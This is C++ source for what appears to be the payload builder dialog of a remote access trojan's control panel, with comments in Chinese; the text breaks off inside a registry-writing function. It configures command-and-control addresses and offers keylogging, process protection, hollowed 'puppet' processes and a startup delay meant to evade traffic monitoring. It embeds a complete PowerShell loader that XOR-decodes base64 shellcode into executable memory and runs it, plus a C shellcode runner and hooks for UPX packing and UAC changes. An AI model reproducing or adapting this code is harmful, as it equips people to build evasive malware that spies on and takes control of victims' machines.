#include "stdafx.h"
#include "Quick.h"
#include "MainFrm.h"
#include "BuildDlg.h"
#include "InputDlg.h"
#include <Strsafe.h>




extern ISocketBase* g_pSocketBase;
extern CMainFrame* g_pFrame;
unsigned char* powershellLogin = NULL;

struct Function
{
	BOOL IsKeyboard;		//键盘离线记录
	BOOL bool0;
	BOOL ProtectedProcess;	//进程保护
	BOOL antinet;			//反查流量
	BOOL RunDllEntryProc;	//是否运行DLL入口

	BOOL  Processdaemon;	//进程守护
	BOOL  puppet;			//傀儡进程
	BOOL  special;
	BOOL  bool4;	//备用
	BOOL  bool5;	//备用



	TCHAR other1[255];  //备用
	TCHAR other2[255];  //备用
	TCHAR other3[255];  //备用
	TCHAR other4[255];	//备用
	TCHAR other5[255];  //备用
};


struct Info
{
	char mark[30];		//标记
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//端口
	BOOL IsTcp;			//通信模式
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//端口
	BOOL IsTcp2;			//通信模式
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//端口
	BOOL IsTcp3;			//通信模式
	TCHAR szRunSleep[30];	//运行等待（开始运行时等待时间 防止手动查看流量监控）
	TCHAR szHeart[30];		//重连时间
	TCHAR szGroup[50];		//分组
	TCHAR szVersion[50];	//版本
	TCHAR Remark[50];		//备注
	Function otherset;		//其他设置
}MyInfo =
{
	"xiugaishiyong",
	_T(""),
	_T(""),
	0,
	_T(""),
	_T(""),
	0,
	_T(""),
	_T(""),
	0,
	_T(""),
	_T(""),
	_T(""),
	_T("1.0"),
	_T(""),
	{
	false,
	false,
	false,
	false,
	false,

	false,
	false,
	false,
	false,
	false,

	_T(""),
	_T(""),
	_T(""),
	_T(""),
	_T(""),

	},

};

struct ShellCodeInfo
{
	char mark[30];		//标记
	int addrlen1;		//IP1长度
	int szPort1;		//端口1
	bool IsTcp1;		//通信模式1
	int addrlen2;		//IP1长度
	int szPort2;		//端口2
	bool IsTcp2;		//通信模式2
}MyShellCodeInfo =
{
	"codemark",
	10,
	3,
	1,
	10,
	3,
	1,
};



const TCHAR confimodel[1000] = _T("|p1:地址1|o1:端口1|t1:通信1|p2:地址2|o2:端口2|t2:通信2|p3:地址3|o3:端口3|t3:通信3|dd:等待|cl:重连|fz:分组|bb:版本|bz:备注|jp:键盘|bh:保护|ll:流量|dl:入口|sh:守护|kl:傀儡|bd:特别|");



char OutData_xor[] = "\r\n /*char* MyFileTabLe = \"xordate\";"
"\r\nint MyFileTabLe_len=strlen(MyFileTabLe);"
"\r\nvoid EncrypMain() //加密/解密dll)"
"\r\n	{"
"\r\n	for (int i = 0, j = 0; i < g_ShellCodeFileSize; i++)"
"\r\n{"
"\r\n	g_ShellCodeFileBuff[i] ^= MyFileTabLe[j++] % 1753 + 79;"
"\r\n	if (i % MyFileTabLe_len == 0)"
"\r\n		j = 0;"
"\r\n}"
"\r\n}*/"
"\r\n";


char OutDataloadfun[] = "/*//使用方法\r\n"
"\r\n typedef void(__stdcall* CODE) ();"
"\r\nPVOID p = NULL;"
"\r\nif ((p = VirtualAlloc(NULL, sizeof(g_ShellCodeFileBuff), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)"
"\r\n	return 0;"
"\r\nif (!(memcpy(p, g_ShellCodeFileBuff, sizeof(g_ShellCodeFileBuff))))"
"\r\nreturn 0;"
"\r\n	CODE code = (CODE)p;"
"\r\n		code();"
"\r\n*/";



char* scriptall = "Set-StrictMode -Version 2\n\
function func_get_proc_address{\n\
	Param($var_module, $var_procedure)\n\
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress',[Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n\
}\n\
function func_get_delegate_type{ \n\
	Param(\n\
		[Parameter(Position = 0, Mandatory = $True)][Type[]] $var_parameters, \n\
		[Parameter(Position = 1)][Type] $var_return_type = [Void]\n\
	)\n\
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])\n\
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\
	return $var_type_builder.CreateType()\n\
}\n\
If([IntPtr]::size -eq 4) {\n\
	[Byte[]] $var_code = [System.Convert]::FromBase64String('替换数据X86')\n\
		for ($x = 0; $x -lt $var_code.Count; $x++) {\n\
			$var_code[$x] = $var_code[$x] -bxor 88\n\
		}\n\
	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n\
		$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\
		[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\
		$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n\
		$var_runme.Invoke([IntPtr]::Zero)\n\
}\n\
If([IntPtr]::size -eq 8) {\n\
	[Byte[]] $var_code = [System.Convert]::FromBase64String('替换数据X64')\n\
		for ($x = 0; $x -lt $var_code.Count; $x++) {\n\
			$var_code[$x] = $var_code[$x] -bxor 88\n\
		}\n\
	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n\
		$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\
		[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\
		$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n\
		$var_runme.Invoke([IntPtr]::Zero)\n\
}";




CBuildDlg* g_pCBuildDlg;
IMPLEMENT_DYNCREATE(CBuildDlg, CXTPResizeFormView)
CBuildDlg::CBuildDlg()
	: CXTPResizeFormView(IDD_BUILD)
	, m_edit_ip(_T(""))
	, m_edit_ip2(_T(""))
	, m_edit_ip3(_T(""))
	, m_edit_port(_T(""))
	, m_edit_port2(_T(""))
	, m_edit_port3(_T(""))
	, m_edit_first_time(_T(""))
	, m_edit_rest_time(_T(""))
	, m_edit_g(_T("默认"))
	, m_edit_v(_T(""))
	, m_edit_dll(_T(""))
	, m_edit_en(_T(""))
	, m_edit_powershell(_T(""))
{
	g_pCBuildDlg = this;
}

CBuildDlg::~CBuildDlg()
{
}


void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildDlg)

	DDX_Text(pDX, IDC_EDIT_IP, m_edit_ip);
	DDX_Text(pDX, IDC_EDIT_IP2, m_edit_ip2);
	DDX_Text(pDX, IDC_EDIT_IP3, m_edit_ip3);

	DDX_Text(pDX, IDC_EDIT_PORT, m_edit_port);
	DDX_Text(pDX, IDC_EDIT_PORT2, m_edit_port2);
	DDX_Text(pDX, IDC_EDIT_PORT3, m_edit_port3);

	DDX_Control(pDX, IDC_COMBO_NET, h_combo_net);
	DDX_Control(pDX, IDC_COMBO_NET2, h_combo_net2);
	DDX_Control(pDX, IDC_COMBO_NET3, h_combo_net3);

	DDX_Control(pDX, IDC_LIST_SET, m_list_set);

	DDX_Control(pDX, IDC_EDIT_TIP, m_edit_tip);

	DDX_Control(pDX, IDC_STATIC_UPX, m_Dragupx);
	DDX_Control(pDX, IDC_STATIC_EN, m_Dragen);
	DDX_Control(pDX, IDC_STATIC_BYTE, m_Dragbyte);
	DDX_Control(pDX, IDC_STATIC_UAC, m_Draguac);
	DDX_Control(pDX, IDC_STATIC_DLLTOSHELLCODE, m_Dragdll2shellcode);

}


BEGIN_MESSAGE_MAP(CBuildDlg, CXTPResizeFormView)
	ON_WM_DROPFILES()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SET, &CBuildDlg::OnRclick)
	ON_NOTIFY(NM_CLICK, IDC_LIST_SET, &CBuildDlg::OnClickListSet)
	ON_BN_CLICKED(IDC_BUILD_EXE, &CBuildDlg::OnBnClickedBuildexe)
	ON_BN_CLICKED(IDC_BUILD_DLL, &CBuildDlg::OnBnClickedBuilddll)


	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER, &CBuildDlg::OnBnClickedButtonAddServer)
	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER2, &CBuildDlg::OnBnClickedButtonAddServer2)
	ON_BN_CLICKED(IDC_BUTTON_ADD_SERVER3, &CBuildDlg::OnBnClickedButtonAddServer3)
	ON_BN_CLICKED(IDC_BUILD_SHELLCODE, &CBuildDlg::OnBnClickedBuildShellcode)
	ON_BN_CLICKED(IDC_BUILD_POWERSHELL, &CBuildDlg::OnBnClickedBuildPowershell)
	ON_BN_CLICKED(IDC_BUILD_POWERSHELL_SET, &CBuildDlg::OnBnClickedBuildPowershellSet)
	ON_BN_CLICKED(IDC_BUTTON_DECODE, &CBuildDlg::OnBnClickedButtonDecode)
	ON_BN_CLICKED(IDC_BUTTON_ENCODE, &CBuildDlg::OnBnClickedButtonEncode)
	ON_BN_CLICKED(IDC_BUTTON_POWERSHELL_OUT, &CBuildDlg::OnBnClickedButtonPowershellOut)
	ON_BN_CLICKED(IDC_BUTTON_POWERSHELL_GET, &CBuildDlg::OnBnClickedButtonPowershellGet)
END_MESSAGE_MAP()




// CBuildDlg 诊断

#ifdef _DEBUG
void CBuildDlg::AssertValid() const
{
	CXTPResizeFormView::AssertValid();
}

#ifndef _WIN32_WCE
void CBuildDlg::Dump(CDumpContext& dc) const
{
	CXTPResizeFormView::Dump(dc);
}
#endif
#endif //_DEBUG


void CBuildDlg::OnInitialUpdate()
{
	CXTPResizeFormView::OnInitialUpdate();
	m_buildonce = false;
	static bool binit = false;

	if (!binit)
	{
		((CEdit*)GetDlgItem(IDC_EDIT__POWERSHELL))->SetLimitText(0x00400000);
		m_edit_ip = _T("127.0.0.1");
		m_edit_ip2 = _T("127.0.0.1");
		m_edit_ip3 = _T("127.0.0.1");
		m_edit_port = _T("6666");
		m_edit_port2 = _T("8888");
		m_edit_port3 = _T("80");
		h_combo_net.SetCurSel(0);
		h_combo_net2.SetCurSel(0);
		h_combo_net3.SetCurSel(0);
		m_edit_first_time = _T("1");
		m_edit_rest_time = _T("1");
		m_edit_g = _T("默认");


		SYSTEMTIME stime;
		GetLocalTime(&stime);
		m_edit_v.Format(_T("%2d.%2d.%2d"), stime.wYear, stime.wMonth, stime.wDay);
		m_edit_dll = _T("run");

		m_edit_en = _T("内存加解密密码");

		//((CButton*)GetDlgItem(IDC_CHECK_KEYBOARD))->SetCheck(FALSE); //不选上
		//((CButton*)GetDlgItem(IDC_CHECK_PROTEXTEDPROCESS))->SetCheck(FALSE); //不选上
		//((CButton*)GetDlgItem(IDC_CHECK_NET))->SetCheck(FALSE); //不选上
		//((CButton*)GetDlgItem(IDC_CHECK_PROCESSDAEMON))->SetCheck(FALSE); //不选上
		//((CButton*)GetDlgItem(IDC_CHECK_PUPPET))->SetCheck(FALSE); //不选上

		m_list_set.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
		m_list_set.InsertColumn(0, _T("地址"), LVCFMT_CENTER, 160, -1);
		m_list_set.InsertColumn(1, _T("协议"), LVCFMT_CENTER, 45, -1);
		m_list_set.InsertColumn(2, _T("端口"), LVCFMT_CENTER, 45, -1);
		m_list_set.InsertColumn(3, _T("状态"), LVCFMT_CENTER, 65, -1);


		//上边控件

		SetResize(IDC_LIST_SET, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_STATIC_ADD, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_IP, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_PORT, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_COMBO_NET, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_BUTTON_ADD_SERVER, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_EDIT_IP2, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_PORT2, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_COMBO_NET2, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_BUTTON_ADD_SERVER2, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_STATIC10, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_IP3, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT_PORT3, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_COMBO_NET3, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_BUTTON_ADD_SERVER3, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_BUILD_DLL, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_STATIC_POWERSHELL, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_EDIT__POWERSHELL, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPRIGHT);

		SetResize(IDC_BUTTON_POWERSHELL_GET, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_BUTTON_DECODE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_BUTTON_ENCODE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_BUTTON_POWERSHELL_OUT, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);



		SetResize(IDC_BUILD_POWERSHELL, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_BUILD_POWERSHELL_SET, XTP_ANCHOR_TOPRIGHT, XTP_ANCHOR_TOPRIGHT);
		

		SetResize(IDC_STATIC_TUO, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPRIGHT);
		SetResize(IDC_STATIC17, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC18, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC19, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC20, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC21, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC_UPX, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC_EN, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC_BYTE, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);
		SetResize(IDC_STATIC_UAC, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_TOPLEFT);

		SetResize(IDC_EDIT_TIP, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMRIGHT);
		binit = true;
	}


	int i = 0;
	ServerMap::iterator it_oneofserver = g_pSocketBase->g_servermap.begin();
	while (it_oneofserver != g_pSocketBase->g_servermap.end())
	{
		CString m_state;
		m_list_set.InsertItem(i, ((Ssocket*)it_oneofserver->second)->m_ip);
		switch (((Ssocket*)it_oneofserver->second)->m_e_socket)
		{
		case tcp:
			m_list_set.SetItemText(i, 1, _T("TCP"));
			break;
		case udp:
			m_list_set.SetItemText(i, 1, _T("UDP"));
			break;
		default:
			break;
		}
		m_state.Format(_T("%d"), ((Ssocket*)it_oneofserver->second)->m_port);
		m_list_set.SetItemText(i, 2, m_state);

		if (((Ssocket*)it_oneofserver->second)->runok)
		{
			m_state = _T("成功");
		}
		else
		{
			m_state = _T("失败");
		}
		if (((Ssocket*)it_oneofserver->second)->m_stop)
		{
			m_state = _T("已停止");
		}
		m_list_set.SetItemText(i, 3, m_state);
		i++;
		it_oneofserver++;
	}
#ifndef BUILD_OPEN

	//STATIC
	(HWND*)GetDlgItem(IDC_STATIC_POWERSHELL)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC4)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC2)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC9)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC8)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC7)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC_TUO)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC17)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC18)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC19)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC20)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC21)->ShowWindow(FALSE);

	//BUTTON
	//powershell

	(HWND*)GetDlgItem(IDC_BUILD_POWERSHELL)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUTTON_POWERSHELL_GET)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUTTON_DECODE)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUTTON_ENCODE)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUTTON_POWERSHELL_OUT)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUILD_POWERSHELL_SET)->ShowWindow(FALSE);

	//build
	(HWND*)GetDlgItem(IDC_BUILD_SHELLCODE)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUILD_DLL)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_BUILD_EXE)->ShowWindow(FALSE);

	//EDIT
	(HWND*)GetDlgItem(IDC_EDIT__POWERSHELL)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT_FIRST_TIME)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT_REST_TIME)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT8_G)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT_V)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT_DLL)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_EDIT_TIP)->ShowWindow(FALSE);

	//ICO
	(HWND*)GetDlgItem(IDC_STATIC_UPX)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC_EN)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC_BYTE)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC_UAC)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_STATIC_DLLTOSHELLCODE)->ShowWindow(FALSE);


	//CHECK_BOX
	(HWND*)GetDlgItem(IDC_CHECK_KEYBOARD)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_CHECK_PROTEXTEDPROCESS)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_CHECK_NET)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_CHECK_PROCESSDAEMON)->ShowWindow(FALSE);
	(HWND*)GetDlgItem(IDC_CHECK_PUPPET)->ShowWindow(FALSE);


#endif // BUILD_OPEN



	UpdateData(FALSE);

}


void CBuildDlg::OnDropFiles(HDROP hDropInfo)
{
	POINT  m_point;
	::GetCursorPos(&m_point);
	CRect rect;
	drop = 0;
	m_Dragupx.GetWindowRect(&rect);
	if (rect.PtInRect(m_point)) drop = 1;
	m_Dragen.GetWindowRect(&rect);
	if (rect.PtInRect(m_point)) drop = 2;
	m_Dragbyte.GetWindowRect(&rect);
	if (rect.PtInRect(m_point)) drop = 3;
	m_Draguac.GetWindowRect(&rect);
	if (rect.PtInRect(m_point)) drop = 4;
	m_Dragdll2shellcode.GetWindowRect(&rect);
	if (rect.PtInRect(m_point)) drop = 5;

	UINT count;
	TCHAR filePath[MAX_PATH] = { 0 };
	count = DragQueryFile(hDropInfo, -1, NULL, 0);
	if (1 == count)
	{
		DragQueryFile(hDropInfo, 0, filePath, sizeof(filePath) * 2 + 2);
		switch (drop)
		{
		case 1:
		{
			upx(filePath);
		}
		break;
		case 2:
		{
			encrypt(filePath);
		}
		break;
		case 3:
		{
			change(filePath);
		}
		break;
		case 4:
		{
			addordeluac(filePath);
		}
		break;
		case 5:
		{
			dll2shellcode(filePath);
		}
		break;
		default:
			break;
		}


	
	}
	else
	{

		for (UINT i = 0; i < count; i++)
		{
			int pahtLen = DragQueryFile(hDropInfo, i, filePath, sizeof(filePath) * 2 + 2);
			switch (drop)
			{
			case 1:
			{
				upx(filePath);
			}
			break;
			case 2:
			{
				encrypt(filePath);
			}
			break;
			case 3:
			{
				change(filePath);
			}
			break;
			case 4:
			{
				addordeluac(filePath);
			}
			break;
			case 5:
			{
			}
			break;
			default:
				break;
			}
		}

		
	}
	::DragFinish(hDropInfo);
	CXTPResizeFormView::OnDropFiles(hDropInfo);

}

void CBuildDlg::OnClickListSet(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	*pResult = 0;


	if (m_list_set.GetSelectedCount() < 1) return;

	POSITION pos = m_list_set.GetFirstSelectedItemPosition();
	int	nItem = m_list_set.GetNextSelectedItem(pos);
	CString str;
	if (!m_buildonce)
	{
		m_edit_ip = m_list_set.GetItemText(nItem, 0);

		m_edit_port = m_list_set.GetItemText(nItem, 2);
		str = m_list_set.GetItemText(nItem, 1);
		if (str.Compare(_T("TCP")) == 0)
		{
			h_combo_net.SetCurSel(0);
		}
		else
		{
			h_combo_net.SetCurSel(1);
		}
		m_buildonce = m_buildonce ? false : true;
		((CEdit*)GetDlgItem(IDC_EDIT_IP))->SetWindowText(m_edit_ip);
		((CEdit*)GetDlgItem(IDC_EDIT_PORT))->SetWindowText(m_edit_port);

	}
	else
	{
		m_edit_ip2 = m_list_set.GetItemText(nItem, 0);
		m_edit_port2 = m_list_set.GetItemText(nItem, 2);
		str = m_list_set.GetItemText(nItem, 1);
		if (str.Compare(_T("TCP")) == 0)
		{
			h_combo_net2.SetCurSel(0);
		}
		else
		{
			h_combo_net2.SetCurSel(1);
		}
		m_buildonce = m_buildonce ? false : true;
		((CEdit*)GetDlgItem(IDC_EDIT_IP2))->SetWindowText(m_edit_ip);
		((CEdit*)GetDlgItem(IDC_EDIT_PORT2))->SetWindowText(m_edit_port);
	}

}




void CBuildDlg::OnRclick(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("&(D)删除端口"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, p.x, p.y, this, NULL);
	menu.DestroyMenu();
	if (!nMenuResult) 	return;

	switch (nMenuResult)
	{
	case 100:
	{
		g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("正在删除，稍等片刻\r\n"));
		POSITION pos = m_list_set.GetFirstSelectedItemPosition();
		if (pos == NULL)
			return;
		while (pos)
		{
			serverstartdate* serverdate = new serverstartdate;
			CString str;
			int nIdx = -1;
			nIdx = m_list_set.GetNextSelectedItem(pos);
			if (nIdx >= 0)
			{
				str = m_list_set.GetItemText(nIdx, 0);
				serverdate->ip = str;
				str = m_list_set.GetItemText(nIdx, 1);
				serverdate->m_net = str;
				str = m_list_set.GetItemText(nIdx, 2);
				serverdate->port = str;
				g_pSocketBase->DelServer(serverdate);
				m_list_set.DeleteItem(nIdx);
			}
			pos = m_list_set.GetFirstSelectedItemPosition();
			delete serverdate;
		}

		WritePortInfo();
		g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("删除成功\r\n"));
	}
	break;
	}

	*pResult = 0;
}


void CBuildDlg::OnBnClickedButtonAddServer()
{
	UpdateData(TRUE);
	serverstartdate* serverdate = new serverstartdate;
	int nCnt = m_list_set.GetItemCount();
	m_list_set.InsertItem(nCnt, m_edit_ip);
	serverdate->m_net = h_combo_net.GetCurSel() ? _T("UDP") : _T("TCP"); ;
	m_list_set.SetItemText(nCnt, 1, serverdate->m_net);
	m_list_set.SetItemText(nCnt, 2, m_edit_port);
	serverdate->ip = m_edit_ip;
	serverdate->port = m_edit_port;
	m_list_set.SetItemText(nCnt, 3, (g_pSocketBase->Addserver(g_pFrame->NotifyProc, g_pFrame, serverdate)) ? _T("成功") : _T("失败"));
	UpdateData(FALSE);
	delete serverdate;
	WritePortInfo();
	g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("添加成功\r\n"));
}

void CBuildDlg::OnBnClickedButtonAddServer2()
{
	UpdateData(TRUE);
	serverstartdate* serverdate = new serverstartdate;
	int nCnt = m_list_set.GetItemCount();
	m_list_set.InsertItem(nCnt, m_edit_ip2);
	serverdate->m_net = h_combo_net2.GetCurSel() ? _T("UDP") : _T("TCP"); ;
	m_list_set.SetItemText(nCnt, 1, serverdate->m_net);
	m_list_set.SetItemText(nCnt, 2, m_edit_port2);
	serverdate->ip = m_edit_ip2;
	serverdate->port = m_edit_port2;
	m_list_set.SetItemText(nCnt, 3, (g_pSocketBase->Addserver(g_pFrame->NotifyProc, g_pFrame, serverdate)) ? _T("成功") : _T("失败"));
	UpdateData(FALSE);
	delete serverdate;
	WritePortInfo();
	g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("添加成功\r\n"));
}

void CBuildDlg::OnBnClickedButtonAddServer3()
{
	UpdateData(TRUE);
	serverstartdate* serverdate = new serverstartdate;
	int nCnt = m_list_set.GetItemCount();
	m_list_set.InsertItem(nCnt, m_edit_ip3);
	serverdate->m_net = h_combo_net3.GetCurSel() ? _T("UDP") : _T("TCP"); ;
	m_list_set.SetItemText(nCnt, 1, serverdate->m_net);
	m_list_set.SetItemText(nCnt, 2, m_edit_port3);
	serverdate->ip = m_edit_ip3;
	serverdate->port = m_edit_port3;
	m_list_set.SetItemText(nCnt, 3, (g_pSocketBase->Addserver(g_pFrame->NotifyProc, g_pFrame, serverdate)) ? _T("成功") : _T("失败"));
	UpdateData(FALSE);
	delete serverdate;
	WritePortInfo();
	g_pCBuildDlg->m_edit_tip.SendMessage(EM_REPLACESEL, 0, (LPARAM)_T("添加成功\r\n"));
}



void CBuildDlg::WritePortInfo()
{
	HKEY hKey;
	TCHAR ExePath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, ExePath, sizeof(ExePath));
	::PathStripPath(ExePath);
	CString	name = ExePath;
	name.Replace(_T(".exe"), _T(" "));
	::RegOpenKeyEx(HKEY_CURRENT_USER, name.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("IpDate"));
	::RegCloseKey(hKey);

	BYTE* B_portinfo = new BYTE[65535];
	portinfo* m_portinfo = new portinfo;
	int m_listnum = m_list_set.GetItemCount();
	if (m_listnum <= 0) return;
	memcpy(B_portinfo, &m_listnum, sizeof(int));
	int sitr = sizeof(int);
	for (int i = 0; i < m_listnum; i++)
	{
		ZeroMemory(m_portinfo, sizeof(portinfo));
		CString	str = m_list_set.GetItemText(i, 0);
		memcpy(m_portinfo->ip, str.GetBuffer(), str.GetLength() * sizeof(TCHAR));
		str = m_list_set.GetItemText(i, 1);
